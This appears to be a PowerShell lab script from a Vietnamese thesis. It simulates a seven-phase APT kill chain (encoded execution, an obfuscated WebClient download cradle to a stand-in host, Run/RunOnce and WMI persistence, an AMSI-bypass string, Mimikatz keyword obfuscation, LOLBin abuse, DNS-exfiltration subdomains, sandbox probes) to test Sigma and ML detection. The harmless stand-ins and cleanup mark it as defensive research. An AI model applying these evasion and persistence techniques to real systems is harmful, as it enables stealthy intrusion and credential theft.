<#
.SYNOPSIS
    APT-style multi-stage attack scenario cho demo RED + AI Agent pipeline.
    7 phase, ánh xạ với Sigma rule cụ thể VÀ taxonomy section 1.4 trong luận văn.

.DESCRIPTION
    Kịch bản post-exploitation kill-chain. 4 mode (giống pattern script demo khác):

    benign   : Hành động admin bình thường tương đương. Sigma + RED đều silent.
    baseline : Pattern CHUẨN (canonical). Sigma rule cứng catch được.
    evasion  : Variant Tier 1+2+3 để né rule. Sigma MISS, RED ML CATCH.
    chain    : Multi-phase realistic — pha trộn baseline + evasion theo kill-chain.

    Mapping với taxonomy 1.4 (Section 1.4 trong luận văn):
    - 1.4.1 Packet Fragmentation: OUT OF SCOPE (network layer, không cover)
    - 1.4.2 Payload Obfuscation:  Phase 1, 2, 4, 5 (Tier 1 + Tier 2)
    - 1.4.3 Encryption/Tunneling: Phase 6 (DNS tunneling marker)
    - 1.4.4 Low-and-Slow:         OUT OF SCOPE (AI Agent correlation cover future work)
    - 1.4.5 Sandbox Evasion:      Phase 7 (system probe marker)
    - 1.4.6 LotL/Fileless:        Phase 3 (WMI), Phase 6 (LOLBins + reflective load)

    Evasion techniques per Phase:
    - Phase 1 (Execution):   Tier 1 shorthand -e | Tier 2 format string | Tier 2 char code
    - Phase 2 (Download):    Tier 1 string split | Tier 2 comment inject | Tier 2 var chain
    - Phase 3 (Persistence): Tier 1 RunOnce      | Tier 3 WMI Event Subscription [1.4.6]
    - Phase 4 (Def Evasion): Tier 1 split kwd    | Tier 3 AMSI bypass marker
    - Phase 5 (Cred Access): Tier 1 concat       | Tier 2 reverse + format
    - Phase 6 (LOLBins):     Tier 3 mshta + regsvr32 + rundll32 [1.4.6]
                             Tier 3 DNS tunneling marker [1.4.3]
                             Tier 3 reflective load marker [1.4.6 fileless]
    - Phase 7 (Sandbox):     Tier 3 system probe (RAM, processes, user activity) [1.4.5]

.NOTES
    LAB-SAFE 100%:
    - Không tải payload từ network, không touch lsass thật.
    - "Dropper" = copy calc.exe.
    - LOLBins = chạy với target NXDOMAIN/benign.
    - AMSI bypass = MARKER trong ScriptBlockText, KHÔNG patch AMSI thật.
    - WMI persistence được auto cleanup.

.PARAMETER Mode
    benign | baseline | evasion | chain (default: chain)

.PARAMETER Phase
    1-6 để chạy 1 phase. 0 = tất cả phase.

.PARAMETER SleepSeconds
    Số giây giữ process powershell.exe alive. Default 240s.

.PARAMETER DryRun
    Chỉ in commands, không thực thi.

.EXAMPLE
    .\apt_demo_scenario.ps1 -Mode chain
    .\apt_demo_scenario.ps1 -Mode evasion -Phase 1
    .\apt_demo_scenario.ps1 -Mode benign -DryRun
#>

param(
    [ValidateSet("benign","baseline","evasion","chain")]
    [string]$Mode = "chain",
    [ValidateRange(0,7)]
    [int]$Phase = 0,
    [int]$SleepSeconds = 240,
    [switch]$DryRun
)

$ErrorActionPreference = "Continue"
$DemoTag = "RED_APT_DEMO"
$RunId = ([guid]::NewGuid().ToString().Substring(0, 8))
$DropperPath = "C:\Users\Public\xkj9_demo_$RunId.exe"
$WmiFilterName = "${DemoTag}_WMI_FILTER_$RunId"
$WmiConsumerName = "${DemoTag}_WMI_CONSUMER_$RunId"

function Write-Phase {
    param([int]$Num, [string]$Title, [string]$SigmaRule, [string]$Tier = "")
    Write-Host ""
    $tierLabel = if ($Tier) { " [$Tier]" } else { "" }
    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] === Phase $Num/7 - $Title$tierLabel" -ForegroundColor Cyan
    Write-Host "    Sigma rule target: $SigmaRule" -ForegroundColor DarkCyan
}

function Write-Action {
    param([string]$Description, [string]$Marker = "")
    Write-Host "  -> $Description" -ForegroundColor Gray
    if ($Marker) { Write-Host "     $Marker" -ForegroundColor DarkGray }
}

function Invoke-If {
    param([scriptblock]$Block)
    if ($DryRun) { Write-Host "     [DryRun] skipped" -ForegroundColor Yellow; return }
    try { & $Block } catch { Write-Warning "     Step failed: $($_.Exception.Message)" }
}

function Should-Run {
    param([int]$ThisPhase)
    if ($Phase -eq 0) { return $true }
    return $Phase -eq $ThisPhase
}

# ============================================================
# Intro
# ============================================================
Write-Host ""
Write-Host "+================================================================+" -ForegroundColor Magenta
Write-Host "|  RED + AI Agent Demo - APT Kill-Chain (Tier 1+2+3 evasion)     |" -ForegroundColor Magenta
Write-Host "|  Mode: $Mode  |  Phase: $(if($Phase -eq 0){'all 7'}else{$Phase})  |  RunId: $RunId" -ForegroundColor Magenta
Write-Host "|  Host: $env:COMPUTERNAME  |  User: $env:USERNAME" -ForegroundColor Magenta
Write-Host "+================================================================+" -ForegroundColor Magenta
if ($DryRun) { Write-Host "  *** DRY RUN ***" -ForegroundColor Yellow }

# ============================================================
# PHASE 1 - Execution (PowerShell encoded command)
# ============================================================
# Sigma target: posh_ps_susp_invocation_specific (literal '-EncodedCommand')
# Tier 1: shorthand '-e' | Tier 2: format string + char code
if (Should-Run 1) {
    Write-Phase 1 "Execution - PowerShell encoded" "posh_ps_susp_invocation_specific" "Tier 1+2"

    if ($Mode -eq "benign") {
        Write-Action "Admin: whoami /upn + ipconfig /all (no -e flag, no base64)"
        Invoke-If { whoami /upn | Out-Null; ipconfig /all | Out-Null }
    }
    elseif ($Mode -in "baseline","chain") {
        $payload = "Write-Host '${DemoTag}_PHASE1_BASELINE_$RunId'; Start-Sleep $SleepSeconds"
        $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
        Write-Action "powershell.exe -EncodedCommand <base64>" "BASELINE: Sigma catch literal '-EncodedCommand'"
        Invoke-If {
            Start-Process powershell.exe -ArgumentList "-NoProfile","-EncodedCommand",$enc `
                -WindowStyle Hidden -PassThru | Select-Object -ExpandProperty Id |
                ForEach-Object { Write-Host "     PID: $_" -ForegroundColor Green }
        }
    }
    elseif ($Mode -eq "evasion") {
        # 3 variant cùng chạy để show breadth
        $payload = "Write-Host '${DemoTag}_PHASE1_EVASION_$RunId'; Start-Sleep $SleepSeconds"
        $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))

        # Variant A — Tier 1: shorthand -e
        Write-Action "Variant A (Tier 1): powershell.exe -e <base64>" "shorthand flag"
        Invoke-If {
            Start-Process powershell.exe -ArgumentList "-NoProfile","-e",$enc `
                -WindowStyle Hidden -PassThru | Select-Object -ExpandProperty Id |
                ForEach-Object { Write-Host "     PID: $_" -ForegroundColor Green }
        }

        # Variant B — Tier 2: format string xây dựng tên cmdlet
        $scriptB = @"
Write-Host '${DemoTag}_PHASE1_EVASION_B_$RunId'
`$cmd = ('{0}{1}{2}' -f 'In','voke-Exp','ression')
Write-Host 'Tier 2 format-string built cmdlet:' `$cmd
"@
        Write-Action "Variant B (Tier 2): format string '{0}{1}{2}' -f 'In','voke-Exp','ression'" "Sigma không match literal 'Invoke-Expression'"
        Invoke-If { try { $sb = [scriptblock]::Create($scriptB); & $sb } catch { } }

        # Variant C — Tier 2: char code -join
        $scriptC = @"
Write-Host '${DemoTag}_PHASE1_EVASION_C_$RunId'
`$cmd = -join ([char]73,[char]69,[char]88)
Write-Host 'Tier 2 char-code built cmdlet:' `$cmd
"@
        Write-Action "Variant C (Tier 2): -join ([char]73,[char]69,[char]88) -> IEX" "không có literal 'IEX'"
        Invoke-If { try { $sb = [scriptblock]::Create($scriptC); & $sb } catch { } }
    }
}

# ============================================================
# PHASE 2 - Download Cradle (WebClient + DownloadString)
# ============================================================
# Sigma target: posh_ps_susp_download.yml
#   detect 'System.Net.WebClient' + ('.DownloadString'|'.DownloadFile')
# Tier 1: split string concat | Tier 2: comment injection + variable chain
if (Should-Run 2) {
    Write-Phase 2 "Download Cradle - WebClient + DownloadString" "posh_ps_susp_download.yml" "Tier 1+2"

    if ($Mode -eq "benign") {
        Write-Action "Invoke-WebRequest localhost (whitelist, không có WebClient class)"
        Invoke-If { Invoke-WebRequest -Uri "http://127.0.0.1/healthcheck" -TimeoutSec 1 -ErrorAction SilentlyContinue | Out-Null }
    }
    elseif ($Mode -in "baseline","chain") {
        $scriptText = "IEX (New-Object System.Net.WebClient).DownloadString('http://red-demo-cradle.invalid/${DemoTag}_PHASE2_BASELINE_$RunId.ps1')"
        Write-Action "IEX (New-Object System.Net.WebClient).DownloadString(...)" "BASELINE: Sigma fires (cả 2 literal có mặt)"
        Invoke-If { try { $sb = [scriptblock]::Create($scriptText); & $sb } catch { } }
    }
    elseif ($Mode -eq "evasion") {
        # Variant A — Tier 1: split string concat
        $scriptA = @"
Write-Host '${DemoTag}_PHASE2_EVASION_A_$RunId'
`$type = ('Sys' + 'tem.Net.WebCl' + 'ient')
`$method = ('.Down' + 'loadStr' + 'ing')
Write-Host 'Tier 1 split-string:' `$type `$method 'on red-demo-cradle.invalid'
"@
        Write-Action "Variant A (Tier 1): 'Sys'+'tem.Net.WebCl'+'ient' concat" "không có literal 'System.Net.WebClient'"
        Invoke-If { try { $sb = [scriptblock]::Create($scriptA); & $sb } catch { } }

        # Variant B — Tier 2: comment injection
        $scriptB = @"
Write-Host '${DemoTag}_PHASE2_EVASION_B_$RunId'
# Tier 2: PowerShell parser bỏ qua <#...#> comments, behavior identical
`$wc = New-Object Sys<#a#>tem.Net.WebCl<#b#>ient
Write-Host 'Tier 2 comment-inject built WebClient:' `$wc.GetType().FullName
# Lab-safe: không actually call DownloadString
"@
        Write-Action "Variant B (Tier 2): Sys<#a#>tem.Net.WebCl<#b#>ient" "Sigma không thấy literal 'System.Net.WebClient'"
        Invoke-If { try { $sb = [scriptblock]::Create($scriptB); & $sb } catch { } }

        # Variant C — Tier 2: variable substitution chain qua env var
        $scriptC = @"
Write-Host '${DemoTag}_PHASE2_EVASION_C_$RunId'
`$env:DEMO_T1 = 'System.Net.'
`$env:DEMO_T2 = 'WebClient'
`$assembled = `$env:DEMO_T1 + `$env:DEMO_T2
`$wc = New-Object -TypeName `$assembled
Write-Host 'Tier 2 env-var chain built:' `$wc.GetType().FullName
Remove-Item Env:\DEMO_T1, Env:\DEMO_T2 -ErrorAction SilentlyContinue
"@
        Write-Action "Variant C (Tier 2): env var assembly New-Object" "literal type name nằm rải qua env"
        Invoke-If { try { $sb = [scriptblock]::Create($scriptC); & $sb } catch { } }
    }
}

# ============================================================
# PHASE 3 - Persistence (Run key + WMI Event Subscription)
# ============================================================
# Sigma target: registry_set_persistence_run_keys
# Tier 1: RunOnce thay Run | Tier 3: WMI Event Subscription (T1546.003)
if (Should-Run 3) {
    Write-Phase 3 "Persistence - Run key / RunOnce / WMI" "registry_set_persistence_run_keys + sysmon_wmi_event_subscription" "Tier 1+3"

    $regRun     = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    $regRunOnce = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
    $regName    = "${DemoTag}_PERSIST_$RunId"

    if ($Mode -eq "benign") {
        Write-Action "Add Run key cho admin tool ký số (OneDrive equivalent)"
        Invoke-If {
            New-ItemProperty -Path $regRun -Name "${DemoTag}_BENIGN_$RunId" `
                -Value "C:\Program Files\Microsoft OneDrive\OneDrive.exe /background" `
                -PropertyType String -Force | Out-Null
        }
    }
    elseif ($Mode -in "baseline","chain") {
        Write-Action "Drop calc.exe + add HKCU\Run\\$regName" "BASELINE: Sigma catch Run + path Users\\Public"
        Invoke-If {
            Copy-Item C:\Windows\System32\calc.exe $DropperPath -Force
            New-ItemProperty -Path $regRun -Name $regName -Value $DropperPath -PropertyType String -Force | Out-Null
        }

        if ($Mode -eq "chain") {
            # Trong chain mode: thêm WMI Event Subscription persistence advanced
            Write-Action "Tier 3 — WMI Event Subscription persistence (T1546.003)" "rare path, Sigma catch nhờ Sysmon Event 19/20/21"
            Invoke-If {
                $filterParams = @{
                    Name = $WmiFilterName
                    EventNameSpace = 'root\cimv2'
                    QueryLanguage = 'WQL'
                    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 3600 WHERE TargetInstance ISA 'Win32_LocalTime'"
                }
                $f = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterParams
                $c = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
                    Name = $WmiConsumerName
                    CommandLineTemplate = "powershell.exe -Command `"Write-Host '${DemoTag}_WMI_FIRED_$RunId'`""
                }
                Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
                    Filter = $f; Consumer = $c
                } | Out-Null
                Write-Host "     WMI persistence created: $WmiFilterName -> $WmiConsumerName" -ForegroundColor Green
            }
        }
    }
    elseif ($Mode -eq "evasion") {
        # Variant A — Tier 1: RunOnce thay Run
        Write-Action "Variant A (Tier 1): HKCU\RunOnce\\$regName" "Sigma rule chỉ check \\Run\\, miss RunOnce"
        Invoke-If {
            if (-not (Test-Path $DropperPath)) {
                Copy-Item C:\Windows\System32\calc.exe $DropperPath -Force
            }
            New-ItemProperty -Path $regRunOnce -Name $regName -Value $DropperPath -PropertyType String -Force | Out-Null
        }

        # Variant B — Tier 3: WMI Event Subscription (đỉnh evasion)
        Write-Action "Variant B (Tier 3): WMI Event Subscription persistence" "T1546.003 — APT29/FIN8 dùng. Không touch registry Run."
        Invoke-If {
            $filterParams = @{
                Name = $WmiFilterName
                EventNameSpace = 'root\cimv2'
                QueryLanguage = 'WQL'
                Query = "SELECT * FROM __InstanceModificationEvent WITHIN 3600 WHERE TargetInstance ISA 'Win32_LocalTime'"
            }
            $f = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterParams
            $c = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
                Name = $WmiConsumerName
                CommandLineTemplate = "powershell.exe -Command `"Write-Host '${DemoTag}_WMI_FIRED_$RunId'`""
            }
            Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
                Filter = $f; Consumer = $c
            } | Out-Null
            Write-Host "     WMI persistence: $WmiFilterName -> $WmiConsumerName" -ForegroundColor Green
            Write-Host "     Velociraptor hunt: Windows.Persistence.PermanentWMIEvents" -ForegroundColor DarkGray
        }
    }
}

# ============================================================
# PHASE 4 - Defense Evasion (Clear Log + AMSI bypass marker)
# ============================================================
# Sigma target: posh_ps_susp_clear_eventlog.yml + posh_ps_amsi_bypass
# Tier 1: split 'Clear-EventLog' | Tier 3: AMSI bypass marker
if (Should-Run 4) {
    Write-Phase 4 "Defense Evasion - Clear Log + AMSI bypass" "posh_ps_susp_clear_eventlog + posh_ps_amsi_bypass" "Tier 1+3"

    if ($Mode -eq "benign") {
        Write-Action "Get-EventLog -List (đọc, không xóa)"
        Invoke-If { Get-EventLog -List | Out-Null }
    }
    elseif ($Mode -in "baseline","chain") {
        $scriptText = @"
Write-Host '${DemoTag}_PHASE4_BASELINE_$RunId'
# Lab-safe — chỉ Get-Command, không thật Clear
Get-Command Clear-EventLog | Out-Null
"@
        Write-Action "Get-Command Clear-EventLog" "BASELINE: literal 'Clear-EventLog' present"
        Invoke-If { try { $sb = [scriptblock]::Create($scriptText); & $sb } catch { } }
    }
    elseif ($Mode -eq "evasion") {
        # Variant A — Tier 1: split keyword
        $scriptA = @"
Write-Host '${DemoTag}_PHASE4_EVASION_A_$RunId'
`$cmdName = 'Clear' + '-Event' + 'Log'
Write-Host 'Tier 1 split-keyword built:' `$cmdName
"@
        Write-Action "Variant A (Tier 1): 'Clear' + '-Event' + 'Log' concat" "literal split"
        Invoke-If { try { $sb = [scriptblock]::Create($scriptA); & $sb } catch { } }

        # Variant B — Tier 3: AMSI bypass marker
        # LAB-SAFE: chỉ marker text trong ScriptBlockText, KHÔNG patch AMSI thật
        $scriptB = @"
Write-Host '${DemoTag}_PHASE4_EVASION_B_$RunId'
# Tier 3 — AMSI BYPASS MARKER (LAB-SAFE, không thực thi)
# Real attacker pattern: [Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils')...
# Marker này sẽ trigger rule posh_ps_amsi_bypass
`$amsiMarker = '[Ref].Assembly.GetType(' + "'System.Management.Automation.Amsi'" + '+Utils").GetField("amsiInitFailed","NonPublic,Static")'
Write-Host 'AMSI bypass detection marker:' `$amsiMarker
"@
        Write-Action "Variant B (Tier 3): AMSI bypass marker (MARKER ONLY)" "T1562.001 — Sigma fires keyword amsiInitFailed"
        Invoke-If { try { $sb = [scriptblock]::Create($scriptB); & $sb } catch { } }
    }
}

# ============================================================
# PHASE 5 - Credential Access marker (Mimikatz keywords)
# ============================================================
# Sigma target: posh_ps_potential_invoke_mimikatz.yml
# Tier 1: split concat | Tier 2: char-code + format
if (Should-Run 5) {
    Write-Phase 5 "Credential Access marker" "posh_ps_potential_invoke_mimikatz.yml" "Tier 1+2"

    if ($Mode -eq "benign") {
        Write-Action "Get-LocalUser (không có Mimikatz keyword)"
        Invoke-If { Get-LocalUser -ErrorAction SilentlyContinue | Out-Null }
    }
    elseif ($Mode -in "baseline","chain") {
        $scriptText = @"
Write-Host '${DemoTag}_PHASE5_BASELINE_$RunId'
# LAB-SAFE marker only
`$mimikatzCmd = 'sekurlsa::logonpasswords'
Write-Host 'Demo marker:' `$mimikatzCmd
"@
        Write-Action "Literal 'sekurlsa::logonpasswords'" "BASELINE: Sigma catch"
        Invoke-If { try { $sb = [scriptblock]::Create($scriptText); & $sb } catch { } }
    }
    elseif ($Mode -eq "evasion") {
        # Variant A — Tier 1: concat split
        $scriptA = @"
Write-Host '${DemoTag}_PHASE5_EVASION_A_$RunId'
`$kw = 'sek' + 'urlsa' + '::log' + 'onpasswords'
Write-Host 'Tier 1 concat:' `$kw
"@
        Write-Action "Variant A (Tier 1): 'sek'+'urlsa'+'::log'+'onpasswords'" "split literal"
        Invoke-If { try { $sb = [scriptblock]::Create($scriptA); & $sb } catch { } }

        # Variant B — Tier 2: char code reverse
        $scriptB = @"
Write-Host '${DemoTag}_PHASE5_EVASION_B_$RunId'
# Tier 2 — char codes for 'sekurlsa'
`$bytes = @(115,101,107,117,114,108,115,97)
`$prefix = -join (`$bytes | ForEach-Object { [char]`$_ })
`$suffix = '::log' + 'onpasswords'
`$assembled = `$prefix + `$suffix
Write-Host 'Tier 2 char-code:' `$assembled
"@
        Write-Action "Variant B (Tier 2): char-code reconstruct 'sekurlsa'" "không có literal anywhere"
        Invoke-If { try { $sb = [scriptblock]::Create($scriptB); & $sb } catch { } }

        # Variant C — Tier 2: format string
        $scriptC = @"
Write-Host '${DemoTag}_PHASE5_EVASION_C_$RunId'
`$built = '{0}{1}::{2}{3}' -f 'sek','urlsa','log','onpasswords'
Write-Host 'Tier 2 format-string:' `$built
"@
        Write-Action "Variant C (Tier 2): '{0}{1}::{2}{3}' -f format" "format string fragmentation"
        Invoke-If { try { $sb = [scriptblock]::Create($scriptC); & $sb } catch { } }
    }
}

# ============================================================
# PHASE 6 - LOLBins + DNS Tunneling + Fileless (Tier 3)
# Maps to thesis: 1.4.3 Encryption/Tunneling + 1.4.6 LotL/Fileless
# ============================================================
# Sigma target: proc_creation_win_mshta_*, proc_creation_win_regsvr32_*,
#               proc_creation_win_susp_dns_query, posh_ps_reflection_assembly_load
if (Should-Run 6) {
    Write-Phase 6 "LOLBins + DNS Tunnel + Fileless (1.4.3 + 1.4.6)" "mshta/regsvr32/rundll32 + DNS + Reflection.Assembly" "Tier 3"

    if ($Mode -eq "benign") {
        Write-Action "Skip — LOLBins không có equivalent benign rõ ràng"
    }
    elseif ($Mode -in "baseline","chain","evasion") {
        # Variant A — mshta javascript [1.4.6 LotL]
        $mshtaJs = "javascript:close(new ActiveXObject('WScript.Shell').Run('cmd /c echo ${DemoTag}_PHASE6_MSHTA_$RunId > C:\Users\Public\mshta_marker_$RunId.txt', 0, true))"
        Write-Action "Variant A [1.4.6 LotL]: mshta.exe javascript:" "T1218.005 — Sigma fires mshta + javascript"
        Invoke-If {
            Start-Process mshta.exe -ArgumentList $mshtaJs -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue |
                Select-Object -ExpandProperty Id |
                ForEach-Object { Write-Host "     mshta PID: $_" -ForegroundColor Green }
        }

        # Variant B — regsvr32 Squiblydoo [1.4.6 LotL]
        Write-Action "Variant B [1.4.6 LotL]: regsvr32 /s /n /u /i scrobj.dll (Squiblydoo)" "T1218.010"
        Invoke-If {
            Start-Process regsvr32.exe -ArgumentList "/s","/n","/u","/i:C:\Windows\System32\scrobj.dll" `
                -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue |
                Select-Object -ExpandProperty Id |
                ForEach-Object { Write-Host "     regsvr32 PID: $_" -ForegroundColor Green }
        }

        # Variant C — rundll32 javascript [1.4.6 LotL]
        Write-Action "Variant C [1.4.6 LotL]: rundll32.exe javascript:" "T1218.011"
        Invoke-If {
            $rundllArg = "javascript:`"\..\mshtml,RunHTMLApplication `";document.write('${DemoTag}_PHASE6_RUNDLL_$RunId');close();"
            Start-Process rundll32.exe -ArgumentList $rundllArg -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue |
                Select-Object -ExpandProperty Id |
                ForEach-Object { Write-Host "     rundll32 PID: $_" -ForegroundColor Green }
        }

        # Variant D — DNS tunneling marker [1.4.3 Encryption/Tunneling]
        # Encode RunId vào subdomain dài bất thường (giống real DNS exfil)
        $b64data = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("${DemoTag}_PHASE6_DNSTUN_$RunId"))
        $b64safe = $b64data.Replace('=','').Replace('+','-').Replace('/','_').ToLower()
        $dnsTarget = "$b64safe.exfil.red-evasion.invalid"
        Write-Action "Variant D [1.4.3 DNS Tunnel]: $($dnsTarget.Substring(0,[math]::Min(60,$dnsTarget.Length)))..." "T1071.004 — long unusual subdomain"
        Invoke-If {
            Resolve-DnsName -Name $dnsTarget -ErrorAction SilentlyContinue -DnsOnly | Out-Null
            Write-Host "     DNS query sent (NXDOMAIN expected, log đủ cho Sigma+RED)" -ForegroundColor DarkGray
        }

        # Variant E — Fileless reflective load marker [1.4.6 Fileless]
        # LAB-SAFE: chỉ marker keyword trong ScriptBlock, KHÔNG load DLL thật
        $scriptE = @"
Write-Host '${DemoTag}_PHASE6_FILELESS_$RunId'
# [1.4.6] Reflective DLL load pattern — APT in-memory execution
# Real attacker: `$bytes = (New-Object Net.WebClient).DownloadData('http://...')
#                [System.Reflection.Assembly]::Load(`$bytes)
# LAB-SAFE: chỉ keyword markers, không load DLL thật
`$markerBytes = [byte[]](0x4D, 0x5A, 0x90)  # MZ signature only
`$markerKw = '[' + 'System.Reflection.Assembly' + ']::' + 'Load'
Write-Host 'Fileless marker keyword:' `$markerKw 'bytes:' `$markerBytes.Length
"@
        Write-Action "Variant E [1.4.6 Fileless]: Reflection.Assembly::Load marker" "T1620 — fileless in-memory load"
        Invoke-If { try { $sb = [scriptblock]::Create($scriptE); & $sb } catch { } }
    }
}

# ============================================================
# PHASE 7 - Sandbox Evasion Marker (Tier 3)
# Maps to thesis: 1.4.5 Sandbox & Analysis Evasion
# ============================================================
# Sigma target: posh_ps_susp_invocation_specific (Get-CimInstance + sandbox keywords)
# LAB-SAFE: chỉ probe + log, không thay đổi behavior dựa trên kết quả
if (Should-Run 7) {
    Write-Phase 7 "Sandbox/Analysis Evasion (1.4.5)" "posh_ps_susp_sandbox_detect" "Tier 3"

    if ($Mode -eq "benign") {
        Write-Action "Get-ComputerInfo (admin probe bình thường)"
        Invoke-If { Get-ComputerInfo -Property CsName, OsName -ErrorAction SilentlyContinue | Out-Null }
    }
    elseif ($Mode -in "baseline","chain","evasion") {
        # Real attacker probe: RAM, process count, sandbox-known processes, mouse activity
        $scriptText = @"
Write-Host '${DemoTag}_PHASE7_SANDBOX_$RunId'
# [1.4.5] Sandbox detection — real malware check trước khi detonate
# LAB-SAFE: chỉ log, không gate behavior

# Check 1 — RAM (sandbox thường < 4GB)
`$ram = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 1)
Write-Host 'Sandbox probe — RAM:' `$ram 'GB'

# Check 2 — Process count (sandbox thường ít process)
`$procCount = (Get-Process).Count
Write-Host 'Sandbox probe — Processes:' `$procCount

# Check 3 — Analyst tools running
`$analysts = @('wireshark','procmon','procexp','x64dbg','ollydbg','ida','ghidra','fiddler')
`$found = Get-Process -ErrorAction SilentlyContinue | Where-Object {
    `$_.Name.ToLower() -in `$analysts
} | Select-Object -ExpandProperty Name -Unique
Write-Host 'Sandbox probe — Analyst tools found:' (`$found -join ',' )

# Check 4 — Mouse cursor moves (real user vs sandbox)
Add-Type -AssemblyName System.Windows.Forms
`$pos1 = [System.Windows.Forms.Cursor]::Position
Start-Sleep -Milliseconds 200
`$pos2 = [System.Windows.Forms.Cursor]::Position
`$moved = (`$pos1.X -ne `$pos2.X) -or (`$pos1.Y -ne `$pos2.Y)
Write-Host 'Sandbox probe — Mouse moved in 200ms:' `$moved

# Check 5 — Uptime (sandbox thường mới boot)
`$uptime = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
Write-Host 'Sandbox probe — Uptime hours:' ([math]::Round(`$uptime.TotalHours, 1))
"@

        if ($Mode -in "baseline","chain") {
            Write-Action "Sandbox probe BASELINE (literal keywords)" "Sigma catch combination of indicators"
        }
        else {
            Write-Action "Sandbox probe EVASION variant" "Same indicators, ScriptBlock gets logged anyway"
        }
        Invoke-If { try { $sb = [scriptblock]::Create($scriptText); & $sb } catch { } }
    }
}

# ============================================================
# Summary
# ============================================================
Write-Host ""
Write-Host "+================================================================+" -ForegroundColor Green
Write-Host "|  Demo done - check Kibana / Velociraptor                       |" -ForegroundColor Green
Write-Host "+================================================================+" -ForegroundColor Green
Write-Host ""
Write-Host "  Mode    : $Mode"
Write-Host "  RunId   : $RunId"
Write-Host "  Marker  : ${DemoTag}_PHASE*_$RunId"
Write-Host ""
Write-Host "  Search trong Kibana:"
Write-Host "    1. logs-winlog* -> RunId '$RunId' (Sysmon + PS + Registry events)"
Write-Host "    2. Security/Alerts -> Sigma rule baseline catch"
Write-Host "    3. red-alerts* -> RED ML catch (BOTH baseline + evasion)"
Write-Host "    4. ai-investigations -> agent triage report VN"

if (-not $DryRun) {
    # Auto-cleanup sau $SleepSeconds + 60s (đủ thời gian cho Forensic Agent query)
    $cleanupBlock = {
        param($Tag, $RunIdArg, $Sleep, $WmiFilter, $WmiConsumer)
        Start-Sleep -Seconds ($Sleep + 60)

        # Files
        Remove-Item "C:\Users\Public\xkj9_demo_$RunIdArg.exe" -Force -ErrorAction SilentlyContinue
        Remove-Item "C:\Users\Public\mshta_marker_$RunIdArg.txt" -Force -ErrorAction SilentlyContinue

        # Registry Run / RunOnce
        foreach ($key in @("HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                           "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce")) {
            $names = (Get-Item $key -ErrorAction SilentlyContinue |
                      Select-Object -ExpandProperty Property) |
                     Where-Object { $_ -like "${Tag}_*_$RunIdArg" }
            foreach ($n in $names) {
                Remove-ItemProperty -Path $key -Name $n -ErrorAction SilentlyContinue
            }
        }

        # WMI persistence
        Get-WmiObject -Namespace root\subscription -Class __EventFilter -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -eq $WmiFilter } | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -eq $WmiConsumer } | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
            Where-Object { $_.Filter -match $WmiFilter } | Remove-WmiObject -ErrorAction SilentlyContinue
    }
    Start-Job -ScriptBlock $cleanupBlock `
        -ArgumentList $DemoTag, $RunId, $SleepSeconds, $WmiFilterName, $WmiConsumerName | Out-Null
    Write-Host ""
    Write-Host "  Auto-cleanup sau $($SleepSeconds + 60) giây (incl. WMI persistence)." -ForegroundColor DarkGray
}

Write-Host ""
